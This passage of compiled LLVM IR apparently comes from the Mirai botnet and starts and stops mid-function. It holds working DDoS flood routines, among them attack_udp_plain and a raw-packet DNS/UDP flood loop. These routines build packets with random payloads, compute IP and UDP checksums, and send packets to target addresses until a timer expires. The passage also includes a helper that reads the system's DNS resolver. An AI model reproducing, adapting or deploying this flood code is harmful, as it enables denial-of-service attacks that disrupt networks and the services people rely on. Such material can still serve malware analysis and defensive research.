; <label>:128:                                    ; preds = %.lr.ph133
  store i8 %.0119130, i8* %.0122128, align 1
  %129 = getelementptr inbounds i8, i8* %117, i64 %indvars.iv
  %130 = getelementptr inbounds i8, i8* %129, i64 1
  br label %.lr.ph133.1138

; <label>:131:                                    ; preds = %.lr.ph133
  %132 = add i8 %.0119130, 1
  br label %.lr.ph133.1138

.lr.ph133.1138:                                   ; preds = %128, %131
  %.1123 = phi i8* [ %130, %128 ], [ %.0122128, %131 ]
  %.1 = phi i8 [ 0, %128 ], [ %132, %131 ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %133 = getelementptr inbounds i8, i8* %26, i64 %indvars.iv.next
  %134 = load i8, i8* %133, align 1
  %135 = icmp eq i8 %134, 46
  br i1 %135, label %197, label %195

._crit_edge134.loopexit.unr-lcssa:                ; preds = %200
  br label %._crit_edge134.loopexit

._crit_edge134.loopexit:                          ; preds = %.lr.ph133.prol.loopexit, %._crit_edge134.loopexit.unr-lcssa
  %.1123.lcssa = phi i8* [ %.1123.lcssa.unr.ph, %.lr.ph133.prol.loopexit ], [ %.1123.1, %._crit_edge134.loopexit.unr-lcssa ]
  %.1.lcssa = phi i8 [ %.1.lcssa.unr.ph, %.lr.ph133.prol.loopexit ], [ %.1.1, %._crit_edge134.loopexit.unr-lcssa ]
  br label %._crit_edge134

._crit_edge134:                                   ; preds = %._crit_edge134.loopexit, %93
  %.0122.lcssa = phi i8* [ %117, %93 ], [ %.1123.lcssa, %._crit_edge134.loopexit ]
  %.0119.lcssa = phi i8 [ 0, %93 ], [ %.1.lcssa, %._crit_edge134.loopexit ]
  store i8 %.0119.lcssa, i8* %.0122.lcssa, align 1
  %136 = getelementptr inbounds i8, i8* %117, i64 %43
  %137 = getelementptr inbounds i8, i8* %136, i64 2
  %138 = bitcast i8* %137 to i16*
  store i16 %113, i16* %138, align 2
  %139 = getelementptr inbounds i8, i8* %137, i64 2
  %140 = bitcast i8* %139 to i16*
  store i16 %113, i16* %140, align 2
  %141 = load i32, i32* %6, align 4
  %142 = add nsw i32 %141, 1
  store i32 %142, i32* %6, align 4
  %143 = icmp slt i32 %142, %40
  br i1 %143, label %73, label %.preheader.loopexit

; <label>:144:                                    ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %56, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %144
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %165
  %storemerge124127 = phi i32 [ %191, %165 ], [ 0, %.lr.ph.preheader ]
  %145 = sext i32 %storemerge124127 to i64
  %146 = getelementptr inbounds i8*, i8** %9, i64 %145
  %147 = load i8*, i8** %146, align 8
  %148 = bitcast i8* %147 to %struct.iphdr*
  %149 = getelementptr inbounds i8, i8* %147, i64 20
  %150 = getelementptr inbounds i8, i8* %147, i64 28
  %151 = getelementptr inbounds i8, i8* %147, i64 41
  br i1 %59, label %152, label %155

; <label>:152:                                    ; preds = %.lr.ph
  %153 = getelementptr inbounds i8, i8* %147, i64 4
  %154 = bitcast i8* %153 to i16*
  store i16 0, i16* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %152, %.lr.ph
  br i1 %61, label %156, label %158

; <label>:156:                                    ; preds = %155
  %157 = bitcast i8* %149 to i16*
  store i16 0, i16* %157, align 2
  br label %158

; <label>:158:                                    ; preds = %156, %155
  br i1 %63, label %159, label %162

; <label>:159:                                    ; preds = %158
  %160 = getelementptr inbounds i8, i8* %147, i64 22
  %161 = bitcast i8* %160 to i16*
  store i16 0, i16* %161, align 2
  br label %162

; <label>:162:                                    ; preds = %159, %158
  br i1 %65, label %163, label %165

; <label>:163:                                    ; preds = %162
  %164 = bitcast i8* %150 to i16*
  store i16 0, i16* %164, align 2
  br label %165

; <label>:165:                                    ; preds = %163, %162
  call void @rand_alphastr(i8* %151, i32 %66)
  %166 = getelementptr inbounds i8, i8* %151, i64 %67
  store i8 0, i8* %166, align 1
  %167 = getelementptr inbounds i8, i8* %147, i64 10
  %168 = bitcast i8* %167 to i16*
  store i16 0, i16* %168, align 2
  %169 = bitcast i8* %147 to i16*
  %170 = call zeroext i16 @checksum_generic(i16* %169, i32 20)
  store i16 %170, i16* %168, align 2
  %171 = getelementptr inbounds i8, i8* %147, i64 26
  %172 = bitcast i8* %171 to i16*
  store i16 0, i16* %172, align 2
  %173 = getelementptr inbounds i8, i8* %147, i64 24
  %174 = bitcast i8* %173 to i16*
  %175 = load i16, i16* %174, align 2
  %176 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %148, i8* %149, i16 zeroext %175, i32 %70)
  store i16 %176, i16* %172, align 2
  %177 = load i32, i32* %6, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %178, i32 0, i32 2, i32 0
  store i32 %27, i32* %179, align 4
  %180 = getelementptr inbounds i8, i8* %147, i64 22
  %181 = bitcast i8* %180 to i16*
  %182 = load i16, i16* %181, align 2
  %183 = load i32, i32* %6, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %184, i32 0, i32 1
  store i16 %182, i16* %185, align 2
  %186 = sext i32 %183 to i64
  %187 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %186, i32 0
  %188 = bitcast %struct.sockaddr_in* %187 to %struct.sockaddr*
  %189 = call i64 @sendto(i32 %34, i8* %147, i64 %72, i32 16384, %struct.sockaddr* %188, i32 16) #10
  %190 = load i32, i32* %6, align 4
  %191 = add nsw i32 %190, 1
  store i32 %191, i32* %6, align 4
  %192 = icmp slt i32 %191, %40
  br i1 %192, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %165
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %144
  %193 = call i64 @time(i64* null) #10
  %194 = icmp sgt i64 %193, %57
  br i1 %194, label %.loopexit.loopexit, label %144

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %32, %5, %54
  ret void

; <label>:195:                                    ; preds = %.lr.ph133.1138
  %196 = add i8 %.1, 1
  br label %200

; <label>:197:                                    ; preds = %.lr.ph133.1138
  store i8 %.1, i8* %.1123, align 1
  %198 = getelementptr inbounds i8, i8* %117, i64 %indvars.iv.next
  %199 = getelementptr inbounds i8, i8* %198, i64 1
  br label %200

; <label>:200:                                    ; preds = %197, %195
  %.1123.1 = phi i8* [ %199, %197 ], [ %.1123, %195 ]
  %.1.1 = phi i8 [ 0, %197 ], [ %196, %195 ]
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge134.loopexit.unr-lcssa, label %.lr.ph133
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @get_dns_resolver() unnamed_addr #0 {
  %1 = alloca [2048 x i8], align 16
  %2 = alloca [32 x i8], align 16
  tail call void @table_unlock_val(i8 zeroext 37)
  %3 = tail call i8* @table_retrieve_val(i32 37, i32* null)
  %4 = tail call i32 (i8*, i32, ...) @open(i8* %3, i32 0) #10
  tail call void @table_lock_val(i8 zeroext 37)
  %5 = icmp sgt i32 %4, -1
  br i1 %5, label %6, label %.loopexit

; <label>:6:                                      ; preds = %0
  %7 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 0
  %8 = call i64 @read(i32 %4, i8* nonnull %7, i64 2048) #10
  %9 = trunc i64 %8 to i32
  %10 = tail call i32 @close(i32 %4) #10
  tail call void @table_unlock_val(i8 zeroext 38)
  %11 = tail call i8* @table_retrieve_val(i32 38, i32* null)
  %12 = call i32 @util_stristr(i8* nonnull %7, i32 %9, i8* %11) #10
  call void @table_lock_val(i8 zeroext 38)
  %13 = icmp ne i32 %12, -1
  %14 = icmp slt i32 %12, %9
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.loopexit

.lr.ph:                                           ; preds = %6
  %.old = add nsw i32 %9, -1
  %15 = add nsw i32 %9, -1
  %16 = sext i32 %12 to i64
  %sext = shl i64 %8, 32
  %17 = ashr exact i64 %sext, 32
  br label %18

; <label>:18:                                     ; preds = %.lr.ph, %39
  %indvars.iv = phi i64 [ %16, %.lr.ph ], [ %indvars.iv.next, %39 ]
  %.02633 = phi i8 [ 0, %.lr.ph ], [ %.2, %39 ]
  %19 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 %indvars.iv
  %20 = load i8, i8* %19, align 1
  %21 = icmp eq i8 %.02633, 0
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %18
  switch i8 %20, label %23 [
    i8 32, label %39
    i8 9, label %39
  ]

; <label>:23:                                     ; preds = %22, %18
  %.1 = phi i8 [ %.02633, %18 ], [ 1, %22 ]
  %24 = icmp eq i8 %20, 46
  br i1 %24, label %29, label %25

; <label>:25:                                     ; preds = %23
  %.off = add i8 %20, -48
  %26 = icmp ugt i8 %.off, 9
  %27 = trunc i64 %indvars.iv to i32
  %28 = icmp eq i32 %27, %15
  %or.cond29 = or i1 %28, %26
  br i1 %or.cond29, label %.critedge, label %39

; <label>:29:                                     ; preds = %23
  %30 = trunc i64 %indvars.iv to i32
  %.old28 = icmp eq i32 %30, %.old
  br i1 %.old28, label %.critedge, label %39

.critedge:                                        ; preds = %29, %25
  %31 = trunc i64 %indvars.iv to i32
  %32 = getelementptr inbounds [32 x i8], [32 x i8]* %2, i64 0, i64 0
  %33 = sext i32 %12 to i64
  %34 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 %33
  %35 = sub nsw i32 %31, %12
  call void @util_memcpy(i8* nonnull %32, i8* %34, i32 %35) #10
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [32 x i8], [32 x i8]* %2, i64 0, i64 %36
  store i8 0, i8* %37, align 1
  %38 = call i32 @inet_addr(i8* nonnull %32) #10
  br label %42

; <label>:39:                                     ; preds = %25, %22, %22, %29
  %.2 = phi i8 [ %.1, %29 ], [ 0, %22 ], [ 0, %22 ], [ %.1, %25 ]
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %40 = icmp slt i64 %indvars.iv.next, %17
  br i1 %40, label %18, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %39
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %6, %0
  %41 = call i32 @htonl(i32 134744072) #11
  br label %42

; <label>:42:                                     ; preds = %.loopexit, %.critedge
  %.0 = phi i32 [ %38, %.critedge ], [ %41, %.loopexit ]
  ret i32 %.0
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #3

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = zext i8 %1 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call noalias i8* @calloc(i64 %7, i64 4) #10
  %11 = bitcast i8* %10 to i32*
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 0, i32 512)
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 1, i32 1)
  %17 = trunc i32 %16 to i8
  %18 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %18, i8 0, i64 16, i32 4, i1 false)
  %19 = tail call i64 @time(i64* null) #10
  %20 = zext i32 %0 to i64
  %21 = add i64 %19, %20
  %22 = and i32 %14, 65535
  %23 = icmp eq i32 %22, 65535
  br i1 %23, label %27, label %24

; <label>:24:                                     ; preds = %5
  %25 = trunc i32 %14 to i16
  %26 = tail call zeroext i16 @htons(i16 zeroext %25) #11
  br label %27

; <label>:27:                                     ; preds = %5, %24
  %.062 = phi i16 [ %26, %24 ], [ 0, %5 ]
  %28 = icmp eq i8 %1, 0
  br i1 %28, label %.preheader, label %.lr.ph68

.lr.ph68:                                         ; preds = %27
  %29 = and i32 %12, 65535
  %30 = icmp eq i32 %29, 65535
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  %34 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %35 = zext i8 %1 to i64
  br label %42

.preheader.loopexit:                              ; preds = %65
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %27
  %36 = icmp eq i8 %1, 0
  %sext = shl i64 %21, 32
  %37 = ashr exact i64 %sext, 32
  %38 = icmp eq i8 %17, 0
  %.mask = and i32 %15, 65535
  %39 = zext i32 %.mask to i64
  %40 = and i32 %15, 65535
  %41 = zext i32 %40 to i64
  %wide.trip.count = zext i8 %1 to i64
  br label %70

; <label>:42:                                     ; preds = %.lr.ph68, %65
  %indvars.iv70 = phi i64 [ 0, %.lr.ph68 ], [ %indvars.iv.next71, %65 ]
  %43 = call noalias i8* @calloc(i64 65535, i64 1) #10
  %44 = getelementptr inbounds i8*, i8** %9, i64 %indvars.iv70
  store i8* %43, i8** %44, align 8
  br i1 %30, label %47, label %45

; <label>:45:                                     ; preds = %42
  %46 = call zeroext i16 @htons(i16 zeroext %13) #11
  br label %47

; <label>:47:                                     ; preds = %42, %45
  %.sink = phi i16 [ %46, %45 ], [ 0, %42 ]
  %48 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv70
  %49 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv70, i32 0, i32 1
  store i16 %.sink, i16* %49, align 2
  %50 = call i32 @socket(i32 2, i32 2, i32 17) #10
  %51 = getelementptr inbounds i32, i32* %11, i64 %indvars.iv70
  store i32 %50, i32* %51, align 4
  %52 = icmp eq i32 %50, -1
  br i1 %52, label %.loopexit.loopexit74, label %53

; <label>:53:                                     ; preds = %47
  store i16 2, i16* %31, align 4
  store i16 %.062, i16* %32, align 2
  store i32 0, i32* %33, align 4
  %54 = load i32, i32* %51, align 4
  %55 = call i32 @bind(i32 %54, %struct.sockaddr* nonnull %34, i32 16) #10
  %56 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv70, i32 2
  %57 = load i8, i8* %56, align 4
  %58 = icmp ult i8 %57, 32
  br i1 %58, label %59, label %65

; <label>:59:                                     ; preds = %53
  %60 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv70, i32 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @ntohl(i32 %61) #11
  %63 = call i32 @htonl(i32 %62) #11
  %64 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv70, i32 0, i32 2, i32 0
  store i32 %63, i32* %64, align 4
  br label %65

; <label>:65:                                     ; preds = %59, %53
  %66 = load i32, i32* %51, align 4
  %67 = bitcast %struct.attack_target* %48 to %struct.sockaddr*
  %68 = call i32 @connect(i32 %66, %struct.sockaddr* %67, i32 16) #10
  %indvars.iv.next71 = add nuw nsw i64 %indvars.iv70, 1
  %69 = icmp slt i64 %indvars.iv.next71, %35
  br i1 %69, label %42, label %.preheader.loopexit

; <label>:70:                                     ; preds = %.preheader, %._crit_edge
  br i1 %36, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %70
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %75
  %indvars.iv = phi i64 [ %indvars.iv.next, %75 ], [ 0, %.lr.ph.preheader ]
  %71 = getelementptr inbounds i8*, i8** %9, i64 %indvars.iv
  %72 = load i8*, i8** %71, align 8
  br i1 %38, label %75, label %73

; <label>:73:                                     ; preds = %.lr.ph
  call void @rand_alphastr(i8* %72, i32 %40)
  %74 = getelementptr inbounds i8, i8* %72, i64 %41
  store i8 0, i8* %74, align 1
  br label %75

; <label>:75:                                     ; preds = %.lr.ph, %73
  %76 = getelementptr inbounds i32, i32* %11, i64 %indvars.iv
  %77 = load i32, i32* %76, align 4
  %78 = call i64 @send(i32 %77, i8* %72, i64 %39, i32 16384) #10
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %75
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %70
  %79 = call i64 @time(i64* null) #10
  %80 = icmp sgt i64 %79, %37
  br i1 %80, label %.loopexit.loopexit, label %70

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit.loopexit74:                             ; preds = %47
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit74, %.loopexit.loopexit
  ret void
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @checksum_generic(i16* nocapture readonly, i32) local_unnamed_addr #5 {
  %3 = icmp ugt i32 %1, 1
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %xtraiter = and i32 %addconv, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %.lr.ph.prol, %.lr.ph.prol.preheader
  %.015.prol = phi i64 [ %11, %.lr.ph.prol ], [ 0, %.lr.ph.prol.preheader ]
  %.01114.prol = phi i32 [ %12, %.lr.ph.prol ], [ %1, %.lr.ph.prol.preheader ]
  %.01213.prol = phi i16* [ %8, %.lr.ph.prol ], [ %0, %.lr.ph.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph.prol ], [ %xtraiter, %.lr.ph.prol.preheader ]
  %8 = getelementptr inbounds i16, i16* %.01213.prol, i64 1
  %9 = load i16, i16* %.01213.prol, align 2
  %10 = zext i16 %9 to i64
  %11 = add i64 %10, %.015.prol
  %12 = add i32 %.01114.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph.prol.loopexit.unr-lcssa, label %.lr.ph.prol, !llvm.loop !3

.lr.ph.prol.loopexit.unr-lcssa:                   ; preds = %.lr.ph.prol
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader, %.lr.ph.prol.loopexit.unr-lcssa
  %.015.unr = phi i64 [ 0, %.lr.ph.preheader ], [ %11, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.01114.unr = phi i32 [ %1, %.lr.ph.preheader ], [ %12, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.01213.unr = phi i16* [ %0, %.lr.ph.preheader ], [ %8, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.lcssa.unr = phi i64 [ undef, %.lr.ph.preheader ], [ %11, %.lr.ph.prol.loopexit.unr-lcssa ]
  %13 = icmp ult i32 %4, 6
  br i1 %13, label %._crit_edge.loopexit, label %.lr.ph.preheader.new

.lr.ph.preheader.new:                             ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph, %.lr.ph.preheader.new
  %.015 = phi i64 [ %.015.unr, %.lr.ph.preheader.new ], [ %29, %.lr.ph ]
  %.01114 = phi i32 [ %.01114.unr, %.lr.ph.preheader.new ], [ %30, %.lr.ph ]
  %.01213 = phi i16* [ %.01213.unr, %.lr.ph.preheader.new ], [ %26, %.lr.ph ]
  %14 = getelementptr inbounds i16, i16* %.01213, i64 1
  %15 = load i16, i16* %.01213, align 2
  %16 = zext i16 %15 to i64
  %17 = add i64 %16, %.015
  %18 = getelementptr inbounds i16, i16* %.01213, i64 2
  %19 = load i16, i16* %14, align 2
  %20 = zext i16 %19 to i64
  %21 = add i64 %20, %17
  %22 = getelementptr inbounds i16, i16* %.01213, i64 3
  %23 = load i16, i16* %18, align 2
  %24 = zext i16 %23 to i64
  %25 = add i64 %24, %21
  %26 = getelementptr inbounds i16, i16* %.01213, i64 4
  %27 = load i16, i16* %22, align 2
  %28 = zext i16 %27 to i64
  %29 = add i64 %28, %25
  %30 = add i32 %.01114, -8
  %31 = icmp ugt i32 %30, 1
  br i1 %31, label %.lr.ph, label %._crit_edge.loopexit.unr-lcssa

._crit_edge.loopexit.unr-lcssa:                   ; preds = %.lr.ph
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph.prol.loopexit, %._crit_edge.loopexit.unr-lcssa
  %.lcssa = phi i64 [ %.lcssa.unr, %.lr.ph.prol.loopexit ], [ %29, %._crit_edge.loopexit.unr-lcssa ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %32 = sub i32 %4, %7
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  %.012.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge.loopexit ]
  %.011.lcssa = phi i32 [ %1, %2 ], [ %32, %._crit_edge.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa, %._crit_edge.loopexit ]
  %33 = icmp eq i32 %.011.lcssa, 1
  br i1 %33, label %34, label %39

; <label>:34:                                     ; preds = %._crit_edge
  %35 = load i16, i16* %.012.lcssa, align 2
  %36 = zext i16 %35 to i64
  %sext = shl i64 %36, 56
  %37 = ashr exact i64 %sext, 56
  %38 = add i64 %37, %.0.lcssa
  br label %39

; <label>:39:                                     ; preds = %34, %._crit_edge
  %.1 = phi i64 [ %38, %34 ], [ %.0.lcssa, %._crit_edge ]
  %40 = lshr i64 %.1, 16
  %41 = and i64 %.1, 65535
  %42 = add nuw nsw i64 %40, %41
  %43 = lshr i64 %42, 16
  %44 = add nuw nsw i64 %43, %42
  %45 = trunc i64 %44 to i16
  %46 = xor i16 %45, -1
  ret i16 %46
}

; Function Attrs: noinline nounwind readonly uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr* nocapture readonly, i8* nocapture readonly, i16 zeroext, i32) local_unnamed_addr #7 {
  %5 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %8 = load i32, i32* %7, align 4
  %9 = icmp sgt i32 %3, 1
  br i1 %9, label %.lr.ph33.preheader, label %._crit_edge34

.lr.ph33.preheader:                               ; preds = %4
  %10 = bitcast i8* %1 to i16*
  %11 = add i32 %3, -2
  %12 = lshr i32 %11, 1
  %13 = shl nuw i32 %12, 1
  %14 = zext i32 %13 to i64
  %15 = add nuw nsw i64 %14, 2
  %scevgep = getelementptr i8, i8* %1, i64 %15
  %16 = shl nuw i32 %12, 1
  %17 = add i32 %3, -2
  %18 = lshr i32 %17, 1
  %19 = add nuw i32 %18, 1
  %xtraiter = and i32 %19, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph33.prol.loopexit, label %.lr.ph33.prol.preheader

.lr.ph33.prol.preheader:                          ; preds = %.lr.ph33.preheader
  br label %.lr.ph33.prol

.lr.ph33.prol:                                    ; preds = %.lr.ph33.prol, %.lr.ph33.prol.preheader
  %.031.prol = phi i32 [ %24, %.lr.ph33.prol ], [ %3, %.lr.ph33.prol.preheader ]
  %.02630.prol = phi i32 [ %22, %.lr.ph33.prol ], [ 0, %.lr.ph33.prol.preheader ]
  %.02729.prol = phi i16* [ %23, %.lr.ph33.prol ], [ %10, %.lr.ph33.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph33.prol ], [ %xtraiter, %.lr.ph33.prol.preheader ]
  %20 = load i16, i16* %.02729.prol, align 2
  %21 = zext i16 %20 to i32
  %22 = add i32 %21, %.02630.prol
  %23 = getelementptr inbounds i16, i16* %.02729.prol, i64 1
  %24 = add nsw i32 %.031.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph33.prol.loopexit.unr-lcssa, label %.lr.ph33.prol, !llvm.loop !5

.lr.ph33.prol.loopexit.unr-lcssa:                 ; preds = %.lr.ph33.prol
  br label %.lr.ph33.prol.loopexit

.lr.ph33.prol.loopexit:                           ; preds = %.lr.ph33.preheader, %.lr.ph33.prol.loopexit.unr-lcssa
  %.031.unr = phi i32 [ %3, %.lr.ph33.preheader ], [ %24, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %.02630.unr = phi i32 [ 0, %.lr.ph33.preheader ], [ %22, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %.02729.unr = phi i16* [ %10, %.lr.ph33.preheader ], [ %23, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %.lcssa44.unr = phi i32 [ undef, %.lr.ph33.preheader ], [ %22, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %25 = icmp ult i32 %17, 6
  br i1 %25, label %._crit_edge34.loopexit, label %.lr.ph33.preheader.new

.lr.ph33.preheader.new:                           ; preds = %.lr.ph33.prol.loopexit
  br label %.lr.ph33

.lr.ph33:                                         ; preds = %.lr.ph33, %.lr.ph33.preheader.new
  %.031 = phi i32 [ %.031.unr, %.lr.ph33.preheader.new ], [ %42, %.lr.ph33 ]
  %.02630 = phi i32 [ %.02630.unr, %.lr.ph33.preheader.new ], [ %40, %.lr.ph33 ]
  %.02729 = phi i16* [ %.02729.unr, %.lr.ph33.preheader.new ], [ %41, %.lr.ph33 ]
  %26 = load i16, i16* %.02729, align 2
  %27 = zext i16 %26 to i32
  %28 = add i32 %27, %.02630
  %29 = getelementptr inbounds i16, i16* %.02729, i64 1
  %30 = load i16, i16* %29, align 2
  %31 = zext i16 %30 to i32
  %32 = add i32 %31, %28
  %33 = getelementptr inbounds i16, i16* %.02729, i64 2
  %34 = load i16, i16* %33, align 2
  %35 = zext i16 %34 to i32
  %36 = add i32 %35, %32
  %37 = getelementptr inbounds i16, i16* %.02729, i64 3
  %38 = load i16, i16* %37, align 2
  %39 = zext i16 %38 to i32
  %40 = add i32 %39, %36
  %41 = getelementptr inbounds i16, i16* %.02729, i64 4
  %42 = add nsw i32 %.031, -8
  %43 = icmp sgt i32 %42, 1
  br i1 %43, label %.lr.ph33, label %._crit_edge34.loopexit.unr-lcssa

._crit_edge34.loopexit.unr-lcssa:                 ; preds = %.lr.ph33
  br label %._crit_edge34.loopexit

._crit_edge34.loopexit:                           ; preds = %.lr.ph33.prol.loopexit, %._crit_edge34.loopexit.unr-lcssa
  %.lcssa44 = phi i32 [ %.lcssa44.unr, %.lr.ph33.prol.loopexit ], [ %40, %._crit_edge34.loopexit.unr-lcssa ]
  %44 = add i32 %3, -2
  %45 = sub i32 %44, %16
  br label %._crit_edge34

._crit_edge34:                                    ; preds = %._crit_edge34.loopexit, %4
  %46 = phi i8* [ %1, %4 ], [ %scevgep, %._crit_edge34.loopexit ]
  %.026.lcssa = phi i32 [ 0, %4 ], [ %.lcssa44, %._crit_edge34.loopexit ]
  %.0.lcssa = phi i32 [ %3, %4 ], [ %45, %._crit_edge34.loopexit ]
  %47 = icmp eq i32 %.0.lcssa, 1
  br i1 %47, label %48, label %52

; <label>:48:                                     ; preds = %._crit_edge34
  %49 = load i8, i8* %46, align 1
  %50 = zext i8 %49 to i32
  %51 = add i32 %50, %.026.lcssa
  br label %52

; <label>:52:                                     ; preds = %48, %._crit_edge34
  %.1 = phi i32 [ %51, %48 ], [ %.026.lcssa, %._crit_edge34 ]
  %53 = lshr i32 %6, 16
  %54 = and i32 %6, 65535
  %55 = lshr i32 %8, 16
  %56 = and i32 %8, 65535
  %57 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i16
  %60 = tail call zeroext i16 @htons(i16 zeroext %59) #11
  %61 = zext i16 %60 to i32
  %62 = zext i16 %2 to i32
  %63 = add nuw nsw i32 %53, %62
  %64 = add nuw nsw i32 %63, %54
  %65 = add nuw nsw i32 %64, %55
  %66 = add nuw nsw i32 %65, %56
  %67 = add i32 %66, %.1
  %68 = add i32 %67, %61
  %69 = lshr i32 %68, 16
  %70 = icmp eq i32 %69, 0
  br i1 %70, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %52
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %71 = phi i32 [ %74, %.lr.ph ], [ %69, %.lr.ph.preheader ]
